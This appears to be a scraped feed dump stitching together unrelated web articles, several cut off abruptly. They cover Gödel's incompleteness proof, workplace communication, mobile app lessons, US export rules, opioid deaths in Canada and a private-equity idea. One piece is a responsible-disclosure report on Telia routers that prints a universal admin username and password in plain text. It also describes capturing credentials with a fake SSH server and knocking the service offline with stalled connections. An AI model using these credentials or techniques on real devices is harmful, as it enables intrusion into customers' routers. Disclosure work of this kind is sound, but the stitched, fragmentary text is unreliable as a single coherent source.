<blockquote><p>We will define a class <b>K</b> of natural numbers as follows: <b>K</b> = { <i>n</i> ∈ IN | ¬ <i>provable(R<b><sub>n</sub></b>(n)) </i>}&nbsp;(where <i>provable(x)</i> means x is a provable formula). K is the set of numbers <i>n</i> where the formula <i>R<b><sub>n</sub></b>(n) </i>that you get when you insert <i>n</i> into its own formula <i>R<b><sub>n</sub></b></i> is improvable. Since all the concepts used for this definition are themselves definable in PM, so is the compound concept <b>K</b>, i.e. there is a class-sign S such that the formula S(n) states that n∈<b>K</b>. As a class-sign, S is identical with a specific <i>R<b><sub>q</sub></b></i>, i.e. we have S ⇔ <i>R<b><sub>q</sub></b></i>&nbsp;for a specific natural number <strong>q</strong>. We will now prove that the theorem <i>R<b><sub>q</sub></b>(q)</i> is undecidable within PM. We can understand this by simply plugging in the&nbsp;definitions:&nbsp;<i>R<b><sub>q</sub></b>(q)</i> ⇔ <i>S(q)</i> ⇔q ∈ K⇔<b> ¬</b><i>(R<b><sub>q</sub></b>(q))</i>, in other words, <i>R<b><sub>q</sub></b>(q)</i> states “<i>I am improvable.</i>“</p></blockquote>
<p>Unless you are an active mathematician, reading and intuitively understanding his proof would be next to impossible. Just in case here is the <a href="http://www.research.ibm.com/people/h/hirzel/papers/canon00-goedel.pdf#page=1" target="_blank" rel="noopener noreferrer">proof again</a> in case you enjoy sharpening your mathematical teeth against this amazing whetstone of logic<a href="#footnote-4" id="refmark-4"><sup>4</sup></a>.</p>
<p>The second, even bigger problem is that understanding the proof will not help you much. Gödel’s logic is so alien, so strange that even understanding the formal deductions won’t help you understand all the implications of that phenomenon. Gödel’s proof is like a map with “<i>X marks the spot</i>”, yet on that map every border connecting it with our reality is torn away. You have no idea what particular area that map refers to. X is there, treasure is certainly there, but how the heck do you <b>practically </b>use it? In ironic self-referential self-validation Gödel’s formal proof cannot be understood formally. It requires an intuition leap that will unlock its secrets. And after you make that leap your perspective on everything related to startups and innovations will change. That is the insight we will try to develop<a href="#footnote-5" id="refmark-5"><sup>5</sup></a>.</p>
<h2>The Theorem</h2>
<blockquote><p>Gödel’s theorem is rapidly becoming accepted as being the fundamental contribution to the foundation of&nbsp; mathematics – probably the <b>most fundamental</b> ever to be found.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="http://en.wikipedia.org/wiki/Roger_Penrose" target="_blank" rel="noopener noreferrer">Roger Penrose</a></p>
</blockquote>
<p>What exactly has Gödel proving? In modern language, simplified statement will be the following:</p>
<blockquote><p>Any … <strong><em>formal system</em></strong> capable of expressing elementary arithmetic cannot be both <strong><em>consistent</em></strong> and <strong><em>complete</em></strong>. In particular, for any consistent, … formal system that proves certain basic arithmetic truths, there is an arithmetical statement that is <strong><em>true, but not provable</em></strong> in theory</p></blockquote>
<p>Let’s work our way through that, since most of the concepts here are actually fairly easy to understand.</p>
<p><strong><em>Formal systems</em></strong> are simple things. They are just collections of <b>axioms</b> and <b>rules</b> on how to manipulate them. For example, lets make a few axioms about numbers:</p>
<ul>
<li>The number 0 exists</li>
<li>Each number has a successor that is a number. One follows zero, two follows one, etc.</li>
<li>Two different numbers can not have the same successor</li>
<li>… more axioms if you wish …</li>
</ul>

<p>If we continue writing down such “self evident” axioms, we can arrive at certain set of axioms, called <a href="http://en.wikipedia.org/wiki/Peano_axioms" target="_blank" rel="noopener noreferrer">Peano axioms</a>. These axioms and few rules of manipulations would constitute the simple arithmetic you learned in kindergarten if not earlier.</p>
<p>Axioms and rules about how axioms can be manipulated to produce derived statements is what constitute a <i>formal system</i>. Systems can be very different from each other. You …</p></div></div>

June 30, 2020 | https://www.gustekdev.com/post/async-vs-sync-communication/ | <a href="https://web.archive.org/web/*/https://www.gustekdev.com/post/async-vs-sync-communication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        <p>We can divide communication into two channels:<br>
<strong>Synchronous</strong> (Sync) - all parties are actively taking part in the conversation right now. For example, physical meetings or a video call<br>
<strong>Asynchronous</strong> (Async) - one party writes or records a message and has to wait for responses for an indefinite amount of time. For example, sending an email or posting on a discussion board.<br>
Conversations on sync channels are usually recorded only in the heads of the participants where async channels are a more permanent medium.<br>
Chat applications are a bit of a grey area; they allow for synchronous communication, but often you have to wait for a response. Because of the inherently fleeting nature of real-time chats, I consider them to be synchronous.</p>
<p>In the workplace, often conversations will revolve around making a decision - for instance, choosing between various options. These conversations, ideally, can be divided into three stages.<br>
Each stage will involve the usage of both synchronous and asynchronous channels. They are:</p>
<ol>
<li>Initialisation</li>
<li>Discussion</li>
<li>Decision</li>
</ol>

<p>This stage starts with someone writing down a proposal, an introduction to the subject, and it may also include some initial research done by the person writing it. It can be a detailed post, or it can be simply an email invitation with a short description of the subject. Follow up with brainstorming to gather opinions; it’s not a time for decisions yet - we are just stimulating the conversation and collecting ideas. After a brainstorming session, one person writes a follow-up post summarising what you have discussed and all the ideas mentioned, including rejected ideas as well for completeness. Someone good at taking notes will be very helpful here.<br>
We have here both synchronous and asynchronous communication.</p>

<p>Now people have been familiarised with the subject. It is time to digest it. I’m sure everyone has experienced clarity after a night of sleep - that is why this stage may take a few days or even weeks, assuming there is no particular time pressure. At this stage, people should mostly use async channels to communicate with the whole group. Sync channels should be seen as supplementary to be used when you want to avoid spamming the async channel with the back and forth of short questions and answers. I recommend adding a summary of such conversations in the async channel later.<br>
Again, we employed both synchronous and asynchronous channels.</p>

<p>When enough time has passed - maybe because there is a deadline, or the discussion is slowing down, or agreement seems to have been reached - we head back to a meeting room to make the decision. Ideally, there should be no more new ideas introduced at this point. In terms of how you pick the winning idea that is another subject. It could be a democratic vote, a manager/leader decision, or dice roll. After the meeting, you write a summary.<br>
Once more, both synchronous and asynchronous communication is involved here.</p>

<p>Writing and speaking with clarity can both be difficult, but they are vital skills and need to be worked on, no excuses here. But if you are bad at either and finding it hard to improve by yourself, then try to find someone good at it and work together.</p>
<h2 id="writing">Writing</h2>
<p>If you are bad at writing, find someone who does it well. Write a draft with what you want to say, and ask them to review it, improve it based on their feedback. Rinse, repeat until it is ready to be shown to a broader audience.</p>
<h2 id="speaking">Speaking</h2>
<p>If you are bad at speaking, then try to write down all the points you want to say first - remember it is ok to read notes in the meetings. You can practice speaking by finding someone who likes to have small debates and discuss opinions with them in a one-on-one setting, so you don’t stress because of group pressure.</p>
<h2 id="my-experience">My Experience</h2>
<p>For me, the writing was always my weaker point of the two. In school and university, I always struggled with reaching the required word count. Today I know that they taught me writing the wrong way. It is not about the word count. If you know what you want to say the words will come by themselves. Write a draft first as if you were talking, then review and improve it. There are a lot of books, blogs, and courses that share tips on how to improve your writing. One point they all agree on is this: write something, anything, and improve later.<br>
My speaking skills improved thanks to a volunteering organisation I was involved with in high school. During my university years, I had a job in customer service that helped a lot as well. When I started working as a software engineer, my problem was lack of confidence and impostor syndrome. I was questioning myself in my mind all the time, which made it hard to take part in conversations. That one is hard to solve, and I don’t have any suggestions here. I overcame it at least partially thanks to my team members at <a href="https://twitter.com/fr_devs">Football Radar</a> showing recognition for my skills.</p>

<p>It is not a case of async versus sync communication. As with many things, it is not one or the other. Each approach has its use cases, and they complement each other. Use them together at the right time to derive the most benefit.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div itemprop="articleBody"><p>So I have spent my last 3 months building&nbsp;<a rel="noreferrer noopener" href="https://pipfeed.com/" target="_blank" data-wpel-link="internal">PipFeed.com</a>. PipFeed is an A.I. powered curated reading app. Think of it as when Pocket met Medium. I am an ex-AWS engineer and my main language of choice is JAVA but I can code in PHP, python, js etc.</p><p>The backend for PipFeed is in JAVA with a few services in python, node.js &amp; PHP. In January 2020 I learned Flutter and built the mobile app for PipFeed using it. This is my first experience building a mobile app and here are some of the learnings that I would like to share with you all.</p><h2>1) Have a CI/CD</h2><p>For mobile apps, it is extremely important to have a CI/CD. We use <a href="http://codemagic.io/" rel="nofollow noopener external noreferrer" target="_blank" data-wpel-link="external">codemagic</a>, it ties up nicely with our Flutter ecosystem. Mobile apps need a lot more work to release like signing, bundle, etc etc.</p><p>P.S. I still don’t have a CI/CD for my backends and I deploy my AWS backend from my laptop using Cloudformation templates.</p><h2>2) Mobile apps crash a lot</h2><p>As compared to websites, backend code, and stand-alone software, mobile apps fail and throw exceptions a lot more. There are all sorts of errors like network errors, some image fails to load etc.</p><p>To make the app stable, we had to add a lot of exception handling, null checks, and mostly retries in almost all network calls.</p><h2>3) Distributed logs</h2><p>We use <a href="https://sentry.io/" rel="nofollow noopener external noreferrer" target="_blank" data-wpel-link="external">Sentry</a> &amp; Crashlytics to manage and catch all our exceptions &amp; logs. We really love the service and it has a nice pricing model. We have now integrated our backend in JAVA with Sentry.</p><h2>4) Analytics is everything</h2><p>We use a mix of <a href="https://firebase.google.com/" rel="nofollow noopener external noreferrer" target="_blank" data-wpel-link="external">firebase</a>, <a href="https://mixpanel.com/" rel="nofollow noopener external noreferrer" target="_blank" data-wpel-link="external">mixpanel</a> &amp; AWS cloudwatch for our analytics. Analytics on mobile is a bit harder as everything you want to track requires a code change. Also, that would mean a lot of network calls for each event.</p><p>We found a way and moved the analytics to our backend system. So on an action like read, like, comment, etc when there is a database update, we trigger lambdas using AWS DDB stream and send metrics from there to other services. This helps us reduce the overall number of network requests and makes it easier to have the logic out of the mobile app.</p><h2>5) It’s so hard to A/B test</h2><p>As compared to any other software A/B testing is really hard on mobile. With websites you can have a version that people will see when they visit your URL with mobile your users will have a whole mix of versions, devices, screen-sizes and a lot more variables. So we are still figuring out how to do this.</p><p>Implementing A/B testing is harder in mobile as we need to create two separate code blocks and use firebase remote config or something similar to run once code block for some users and another for some other.</p><h2>6) Login/SignUp is the most important screen in your app</h2><p>The most important piece of code in your mobile app is your login/signup page. We learned this the hard way. We never paid much attention to our sigun/login page but when we analyzed the analytics we saw that from all the people who “installed” the app only 60% were actually signing up.</p><p>Hence we now do rigorous testing of our signup page. After so much work we still keep finding a lot of bugs/error in our login &amp; signup flow.</p><h2>7) Updates are harder because of backward compatibility</h2><p>With AWS, I am used to pushing to Production almost every other day. But with mobile, you need to take care of backward compatibility a lot more.</p><p>Like we have a bug in our app where a blog will show as being “unfollowed” even when the user is following it. This was caused by two bugs with one being in the mobile app and another in our backend. Now if I fix the backend bug the current mobile app will break. So what we do? We fixed the bug in the mobile app and after around 15 days or when 90% of users have updated to the latest app, we will push fix to the backend.</p><h2>8) Have a clear 2-way communication channel with users</h2><p>It is very important to have some way in which users can reach out to you. At first, we thought just asking our users to email us would be enough but I think around 5% of all users ever emailed us. That’s when we found <a href="https://instabug.com/" rel="nofollow noopener external noreferrer" target="_blank" data-wpel-link="external">Instabug</a>. This is a really amazing tool and they provide a 2-minute installation. I think in all the tools mentioned here, this was the easiest to setup. We run all sorts of surveys including Net promoter Score surveys, survey to nudge users to upgrade etc. Also, Instabug lets users submit bugs reports and even vote on feature requests.</p><p>If you have a mobile app, it is very important to have a NPS survey. This is probably the one metrics VCs really care about.</p><hr><p>That’s all for now. These were the learning I have had from working on mobile apps for the last 3 months. I hope these were helpful.</p><p>Do checkout PipFeed. The app is both in the play store and app store and let me know what you guys think.</p></div></div></div>]]>

June 29, 2020 | https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor.html | <a href="https://web.archive.org/web/*/https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Multiple vulnerabilities could allow running arbitrary code on an intranet server and gain root access on all the customers' routers</p>

<p>Telia is a Swedish multinational telecommunications company. It also operates in Lithuania and provides mobile service, FTTH internet, DSL internet and IPTV. Telia rents and sells custom routers and set-top tv boxes to customers which have limited or almost no administration access left to them.</p>

<p>Every Telia router or tv box has a backdoor or "management interface". It is an <code>SSH</code> server running on VLAN 5 and/or WAN. Usually, it is running on port <code>8022</code>. Older models, like <code>ADB</code>, have password login enabled. The recent newer models, like <code>Technicolor</code>, have password login disabled and only use ssh with public key authentication (spoiler: it is still vulnerable).</p>

<p>Savitarna (in Lithuanian "Self service") - is a web service <a href="https://www.telia.lt/mano/sso">https://www.telia.lt/mano/sso</a> that allows Telia customers to order and manage services, get invoices, pay bills etc. It uses password authentication or external authority logins such as Facebook, Google, banking, digital signature etc. One of the new features: changing your router's wifi password. Sounds interesting, right? An internet web service that is able to change your local router's wifi password.</p>
<p>Login page:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-login.jpg" alt="Telia Savitarna web login page"></p>
<p>Change wifi settings:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-wifi-settings.jpg" alt="Telia Savitarna WiFi setting change feature"></p>

<p>How that works. When a user wants to change the password, the web service calls the backend to initiate an SSH connection to the user's associated router. Depending on the router it will be either password authentication or RSA public key. After a successful login a PHP script on the backend will issue some commands in the router's shell, parse the result and output some of the data to the user in the web UI, like wireless network name. <strong>Telia knows your WIFI password in plain text</strong>, keep it in mind and do not reuse this password anywhere. Overall scheme:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-scheme.jpg" alt="Overall scheme of Telia backdoor"></p>

<p>Let's take a look at how the SSH connection is established. Network capture shows an SSH client banner and the remote IP that initiated the connection:</p>
<p><code>SSH-2.0-libssh2_1.4.2 PHP 10.0.98.251</code></p>
<p>What is important here:</p>
<ul>
<li>Vulnerable <code>libssh2</code> version <code>1.4.2</code> <a href="https://www.libssh2.org/security.html">https://www.libssh2.org/security.html</a></li>
<li>Weak and deprecated key exchange <code>diffie-hellman-group1-sha1</code></li>
<li>The client does not verify <code>remote SSH server public key</code> (see below)</li>
<li><code>PHP</code></li>
</ul>
<p>And, yes, it turns out that Telia's client does not attempt to verify the remote server's public key. We were able to start a custom SSH server on the same port 8022 and Savitarna successfully established a connection without even trying to verify for a man-in-the-middle. This means that we can see the password used and could try to create a malicious SSH server that exploits public vulnerabilities on Telia's side.</p>

<p>That was an easy task. As soon as Telia's client connected to our malicious SSH server we got the universal router credentials:</p>
<pre>User: tadmin
Password: hqMV8Wps
</pre>

<p>Do you still own an ADB router? Just go ahead and login over the web interface with this user. You are now an admin. You can do some restricted stuff now, great! But what about the root shell? We were able to connect with those credentials locally and got a limited shell. That's nice too. This gave us a lot of additional information that was hidden inside the router, many more vulnerabilities. Using one of them we were able to escalate to root and got full access over the device. The newer models like Technicolor require some additional exploits chained to gain full root access, but all are publicly available and so - easily doable.</p>

<p>In order to exploit RCE we needed to build a virtual test environment that fully copies Telia's PHP client. Step by step we have gone through the sequence of Telia's commands sent over the SSH. And finally we got a malicious SSH server and a test libssh2 client running in our test lab. With this server we could fully control the protocol and start fuzzing.</p>
<p>In the first few days of the fuzzing we got some crashes and partially confirmed that RCE may be exploited. Here is a sample GIF video that demonstrates two kinds of the issues the fuzzer found for us. Same php file was executed twice, but the malicious SSH server sent different payloads which caused:</p>
<ul>
<li>Segfault (stack corruption)</li>
<li>Infinite loop with high CPU</li>
</ul>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-poc.gif" alt="GIF PoC video"></p>
<p>However, at the time of the report we couldn't find an easy way to exploit the stack corruption. It may require more time, longer and more sophisticated fuzzing and more knowledge about the server. As Lithuanian law prohibits exploit testing on the real server, we could only fingerprint the Windows OS, but nothing more.</p>

<p>The backend seems to run only 5 php processes, so it is fairly easy to perform DoS by keeping stalled ssh connections. When SSH connections stay active for too long filling all the 5 php processes (there seems to be no timeout reading the remote shell), the Savitarna will show a strange "Maintenance" message:</p>
<p>Translation:</p>
<pre>An update is in progress
Too many of you are trying to access the new Telia webpage.
We are expanding the resources and will accept you all soon.
Apologies for any inconvenience
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-DoS.jpg" alt="Service unavailbale"></p>

<p>If we now get all together, an attacker could exploit RCE on the intranet server and use that server to move laterally (because <code>10.0.98.251</code> is whitelisted everywhere) across all the customer routers with the same credentials creating the most powerful, persistent and undetectable botnet of Lithuania. Who knows, maybe someone already exploited that? (spoiler: see bonus section)</p>

<p>The report was responsibly disclosed to Telia and a copy sent to <code>CERT LT</code> (<a href="https://www.nksc.lt/">NKSC</a>). What happened next was a little bit of a surprise to the team. There were rumours previously about Telia's poor tech level, but we have experienced this in a real case.</p>
<p>First, Telia did not have a PGP key and did not know how to use it, so instead they asked us to ZIP the report with password and send the password over a separate email (private GMail). I hope Telia's engineers will be reading this article, so I would like to explain why the report should be encrypted. This is to protect you as the affected vendor. If there is a man in the middle who can intercept all the researcher's traffic, it will be very easy to get the ZIP file in the first email and then the password in the second email. Instead, PKI like PGP only allows to decrypt the report by the private key owner, ensuring that nobody else can intercept the report and exploit the vulnerabilities before you fix them all. </p>
<p>Second, Telia tried to threaten the reporter for the vulnerability discovery:</p>
<p>Translation:</p>
<pre>Thank you for the information
Are you sure you did not violate the electronic data protection law?
</pre>

<p>Original:</p>
<pre>Dėkojame už informaciją.
Ar tikrai tyrimą atlikote ir neviešus elektroninius duomenis rinkote
nepažeidžiant galiojančių įstatymų?

<p>And then they once again mentioned that they will check if this report wasn't a hacking attempt and that they will persecute any reporter that discloses any information about Telia vulnerabilities:</p>
<p>Translation:</p>
<pre>Thank you for the information. We will continue to check whether you made your report
legally without violating any law. And we will ensure that no fake information will be
published that could do any harm to the company's reputation and to the critical part
of Lithuanian network infrastructure.

<p>* Note: partial fix for KEX means the new KEX is not considered to be weak, however it is now possible to exploit libssh2 vulnerabilities after 1.8.0 with this particular KEX and a publicly known exploit for <a href="https://github.com/Semmle/SecurityExploits/blob/446048470633bf0f8da9570d008d056dbaa28ea9/libssh2/out_of_bounds_read_kex_CVE-2019-13115/server/home/diff.txt">KexAlgorithms diffie-hellman-group-exchange-sha256</a></p>

<p>After getting the root access and analyzing the Telia's routers' firmwares, we found several more users, like <code>ladmin</code> and <code>technician</code>. We will not disclose those passwords (yet), as it is not clear yet how both are used. But we were surprised that Telia's passwords appeared to be leaked many years ago. You can try to search for the tadmin password's hash on the web and you will be surprised - there was an attempt to crack the hash back in 2014!</p>

<p>And finally, we found that the hash was cracked and was available in the old "weakpass" database. You can search for the "old" weakpass database (sometimes named "First version of weakpass") and grep it - password is there. This means that most probably we are not the first who were able to penetrate Telia.</p>

								<p>On April 28, 2020, the U.S. Commerce Department’s Bureau of Industry and Security (BIS) published two final rules that will eliminate the license exception for civil end users (CIV) in the People’s Republic of China, Russia, and Venezuela and expand military end use and end user restrictions on these countries. These rules confront the national security risks presented by the increasing integration of civilian and military technology development, particularly in China, by requiring U.S. Government review of a broader range of exports including electronics and telecommunications items only controlled for antiterrorism (AT) reasons (with licenses subject to a presumption of denial) when shipped for military end uses or to military end users. These final rules will go into effect on June 29, 2020.</p>
<p>BIS also published a proposed rule that would modify License Exception Additional Permissive Reexports (APR) by restricting the destinations that will be eligible for the license exception. Comments on the proposed rule are also due June 29, 2020.<span id="more-1180"></span></p>
<p><strong>Expansion of Controls Related to Military End Use or Military End Users in China, Russia, or Venezuela</strong></p>
<p>The <a href="https://www.govinfo.gov/content/pkg/FR-2020-04-28/pdf/2020-07241.pdf">first final rule</a> expands license requirements for exports, reexports, and transfers (in-country) of items intended for military end uses and military end users in China, Russia, and Venezuela, pursuant to § 744.21 of the EAR. Effective June 29, 2020, the final rule:</p>
<ul>
<li><strong>Imposes a restriction on exports to <u>military end users</u> in China, similar to current requirements for Venezuela and Russia.</strong> Currently, for specified items, EAR Section 744.21 requires a license where the exporter has knowledge that (i) an item destined for China, Russia, or Venezuela will be used for a <u>military end use</u>, or (ii) an item destined for Russia or Venezuela (but not China) will be for a <u>military end user</u>.</li>
<li>
<ul>
<li>The term “military end user,” includes not only “the national armed services (army, navy, marine, air force, or coast guard), as well as the national guard and national police, government intelligence or reconnaissance organizations,” but also “<u>any person or entity whose actions or functions are intended to support ‘military end uses</u>.’”</li>
<li>Many large commercial manufacturers and other companies, particularly in China (as well as Russia and to a lesser extent Venezuela) may conduct some activities in support of a military end use. Under the new rule, it appears that a license may be required to export the covered categories of items (e.g., 3A991 integrated circuits) to such companies, even if the item itself will be used exclusively in connection with commercial applications. If interpreted in this way, the rule could have a broad impact; it will be important to monitor further guidance from BIS. Under any interpretation, exporters will need to focus their due diligence on whether any aspect of their counterparties’ business supports military end uses particularly in China, given what BIS refers to in the rule as “China’s widespread civil-military integration.”</li>
</ul>
</li>
<li><strong>Significantly expands the list of items subject to the military end use and end user license requirements in Supplement No. 2 to Part 744 of the EAR</strong> for exports to China, Russia, and Venezuela. The list will now also include certain materials processing, electronics, telecommunications, mass market encryption items, sensors and lasers, propulsion, electronics, maritime equipment, and aircraft items on the Commerce Control List (CCL). For example, sending a 3A991 chip, a 5A992 iPhone, or a copy of 5D992 Microsoft Windows to a military end user in China would be subject to this restriction.</li>
<li><strong>Broadens the “military end use” definition. </strong> “Military end use” currently is defined as:</li>
<li>
<ul>
<li>Incorporation into a military item described on the U.S. Munitions List (USML);</li>
<li>Incorporation into a military item described on the Wassenaar Arrangement Munitions List (as set out on the Wassenaar Arrangement Web site at <a href="http://www.wassenaar.org/">http://www.wassenaar.org</a>);</li>
<li>Incorporation into items classified under ECCNs ending in “A018” or under “600 series” ECCNs; or</li>
<li>For the “use,” “development,” or “production” of military items described above.</li>
</ul>
</li>
</ul>
<p>“Use” normally has a conjunctive definition with six elements – meaning all the elements need to be satisfied to constitute “use.” In this case, the final rule expands the “military end use” definition to also include<u> any item that supports or contributes to any one of the elements of “use,” i.e., the operation, installation, maintenance, repair, overhaul, refurbishing, “development,” <strong>or</strong> “production,” of military items.</u></p>
<ul>
<li><strong>Adopts a policy of presumption of denial of licenses </strong>for exports to China, Russia, and Venezuela for military end uses and end users, rather than the existing case-by-case license review standard. Accordingly, license applications pursuant to EAR § 744.21 will be denied in most cases.</li>
<li><strong>Expands Electronic Export Information (EEI) requirements for all items listed on the CCL that are destined for China, Russia, and Venezuela – independent of end use or value. </strong>Per the Foreign Trade Regulations, many less sensitive AT-controlled items generally do not require EEI reporting at all if their value is less than $2,500, and even if reported, the EEI would generally not need to specify an ECCN. The final rule requires EEI reporting to identify specific ECCNs for tangible exports of all items listed on the CCL to China, Russia, and Venezuela, with very few exceptions. As a result, even if a company does business with these countries entirely in the commercial realm, its export reporting obligations may change.</li>
</ul>
<p><strong>Elimination of License Exception Civil End Users (CIV) </strong></p>
<p>The <a href="https://www.govinfo.gov/content/pkg/FR-2020-04-28/pdf/2020-07240.pdf">second final rule</a> eliminates License Exception CIV. License Exception CIV currently authorizes the export of certain items that are controlled for national security (NS) reasons provided that the items are destined to civil end users for civil uses in Country Group D:1, which includes, among others, China, Russia, Venezuela, Ukraine, and Iraq. A number of items currently may be exported under License Exception CIV, including certain telecommunication equipment and computers. Accordingly, as of June 29, 2020 companies will no longer be able to utilize License Exception CIV.</p>
<p><strong>Modification of License Exception Additional Permissive Reexports (APR)</strong></p>
<p>The <a href="https://www.federalregister.gov/documents/2020/04/28/2020-07239/modification-of-license-exception-additional-permissive-reexports-apr">third rule</a> is a proposed rule that would modify License Exception APR, which currently authorizes the reexport of certain items from Country Group A:1 or Hong Kong to destinations in Country Group B (so long as the destination is not also in Country Groups D:2, D:3, or D:4) and Country Group D:1. The rule proposes removing destinations in Country Group D:1, including China, as eligible recipients of national security-controlled items reexported under License Exception APR.</p>

For me, at work, that means every day at 5:30 p.m. ET there's an update on COVID-19 from public health officials in Alberta and at 6 p.m. ET the same thing happens in BC. Over the past few weeks, it's more like every other day, but you get my drift.&nbsp;</p>  <p>Because those are the provincial updates that fall on my watch, I've listened to more than a hundred of them and I'm pretty sure the inside voice in my head is now either Dr. Deena Hinshaw or Dr. Bonnie Henry. And it's always telling me to stay calm and be kind.&nbsp;</p>  <p>Which is why last Thursday, accustomed to my normal show routine, I was jolted to hear Dr. Henry in tears. She wasn't talking about COVID-19 though, at least not directly. She was talking about overdoses.</p>  <p><em><strong>Watch Dr. Henry's comments on the opioid fatalities:</strong></em><br> <span><span><span></span><span>B.C.'s provincial health officer teared up as she shared her condolences with the loved ones of overdose victims.<!-- --> <!-- -->2:47</span></span></span></p>  <p>Last month in B.C. a record number of people died from an overdose; 170. It's also more than the total number of deaths due to Coronavirus in the province; 167. More than 400 people in B.C. have died from overdosing during the three months COVID-19 measures have been in place.&nbsp;</p>  <p>Dr. Henry's emotion was raw as she talked about those numbers. They were moms, dads, sons and daughters. She also noted the increased toxicity of street supply.&nbsp;</p>  <p>"COVID-19 is not our only health crisis," she told reporters. "I cannot express how difficult this news has been to hear, my thoughts and condolences go to those who have lost their loved ones and I share your grief."</p>    <p>I can't imagine the impact of isolation on someone who suffers from addiction. The decision to reach out and ask for help, or to talk to a friend, must already be tough — but the inability to do so must be crushing. Outreach workers say physical distancing measures also mean less people can access addiction services. It is a devastating combination.&nbsp;</p>  <p>According to <a href="https://www.cbc.ca/news/health/drug-overdoses-covid19-1.5605563"><u>a report by CBC's Health unit,</u></a> early data from Ontario shows a 25% increase in the number of overdose-related deaths from March to May over the same period last year.</p>  <p>In Alberta, the number of opioid-related calls to EMS went from 257 in March to 550 this May.</p>  <p>A report from Toronto's medical officers of health shows paramedics there responded to 25 suspected opioid overdose deaths in April, the highest number since September 2017.</p>    <p>In an interview last week, Vancouver mayor Kennedy Stewart was also visibly shaken by the increase in deaths in his province.&nbsp;</p>  <p>"This keeps me up every night and it has, really, since I started campaigning for mayor," he told me.&nbsp;</p>  <p>Stewart stressed the importance of finding a safe drug supply — essentially a prescription alternative to street drugs — and lauded the federal government's efforts on that front during the pandemic. He hopes the measures aren't temporary.</p>  <p>"We've got to make it permanent … otherwise these numbers are just going to continue, not just here, but right across the country."</p>  <p><span><span><span></span><span>Outreach workers worry that easy access to CERB may be linked to a spike in opioid overdoses in Ontario and B.C.<!-- --> <!-- -->2:03</span></span></span></p>  <p>Public health officials in various parts of the country are pressing Ottawa for more funding for a safe supply of drugs in their provinces and cities. People I spoke to in the federal government say they expect to be able to provide a lot of that funding soon — but provinces have some jurisdiction here as well. On the question of whether to make safe supply funding permanent, everyone I spoke to said a decision hadn't been made, but the federal minister of health was open to the conversation.&nbsp;</p>  <p>Dr. Henry has gone a step further than making a call for a safe drug supply in the past; calling for decriminalization of all illicit drugs.&nbsp;</p>  <p>That's a controversial position and often a politically contentious one — we saw that in the last federal election. Unsurprisingly, the call to decriminalize was rejected by governments prior to COVID-19; but this pandemic has changed so much — given the heartbreaking volume of overdoses in the last three months I wonder if it will change that too.</p>  <hr>  <h2>Subscribe to the full newsletter</h2>  <p>This is just one part of the Minority Report newsletter.&nbsp; Read the latest on the government's response to the COVID-19 pandemic by&nbsp;<a href="http://newsletters.cbc.ca/q/119z4mlxXDye/wv" title="Read the full newsletter">clicking here</a>, or&nbsp;<a href="http://www.cbc.ca/minorityreport" target="_blank">sign up for the newsletter here</a>&nbsp;and it will be delivered directly to your inbox every Sunday.</p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-86cc504f0c3a34e020e4"><div><p><strong>Problem: </strong>Right now, investing in private equity funds is only open to accredited investors and qualified clients. However, on June 3rd “The U.S. Department of Labor, which oversees retirement plan rules, on June 3&nbsp;<a href="https://www.bloomberg.com/news/articles/2020-06-03/private-equity-firms-get-trump-administration-s-nod-to-tap-401ks" title="Private Equity Gets a Big Win With U.S. Nod to Tap 401(k) Plans" target="_blank">issued guidance</a>&nbsp;that’s been taken as a green light to include PE funds in some plans. It doesn’t say that workers should suddenly get an option to pick one by themselves. Rather a PE fund might be included as part of the portfolio of another diversified fund.”</p><p><strong>Solution: </strong>A private equity fund that is funded primarily through 401ks. As described by Bloomberg in their article <a href="https://www.bloomberg.com/news/articles/2020-06-26/private-equity-is-coming-for-the-6-trillion-401-k-market">"Private Equity is Coming for The $6 Trillion 401k Market":</a></p><blockquote><p><a href="https://www.bloomberg.com/news/articles/2020-06-26/private-equity-is-coming-for-the-6-trillion-401-k-market">There’s roughly $5.6 trillion in such accounts (401ks),</a> and the prospect of capturing even a sliver of it has the industry abuzz. A more complicated question is whether ordinary investors will really want their money going into&nbsp;<a href="https://www.bloomberg.com/news/features/2019-10-03/how-private-equity-works-and-took-over-everything" title="Everything Is Private Equity Now" target="_blank">buyout funds</a>.</p><p><a href="https://www.bloomberg.com/quicktake/private-equity" title="QuickTake: Private Equity" target="_blank">Private equity is a different beast</a>&nbsp;from the mutual funds retirement savers are familiar with. PE managers often buy companies whole, financing the purchase with debt that ends up on the books of the companies themselves. That adds to potential profits but also to risk and complexity. Funds tend to have long lockup periods, during which investors can’t get their money out, and charge high management fees as well as take a share of profits off the top.</p></blockquote><p>Since this new guidance was issued less than 30 days ago, the industry is ripe for disruption. Because it is so new, the business would be primarily focused on marketing the opportunity to prospective investors and educating them about the potential risks and rewards. Of course, since PE funds would be layered inside other funds, the business’ goal would be to become part of as many blended funds as possible: thus, another avenue of marketing would be to fund-makers to be included in their funds and receive 401k dollars.</p><p><strong>Monetization: </strong>Ultimately, the goal of the business would be to acquire as much capital as possible: <a href="https://pitchbook.com/news/articles/how-private-equity-firms-make-money">PE funds have a monetization</a> model of fees (about 2%) and carried interest (20%). This business would adopt that model.</p></div></div></div>]]>

        <p>It’s crazy to think my startup is already over 6 months old. This post is some informal reflections on that period.</p>
<p>To set the context for people who are not me, this was my first foray into startups. The startup is pretty lean (it’s a saas security startup), only on the verge of profitability. Single digit customers.</p>
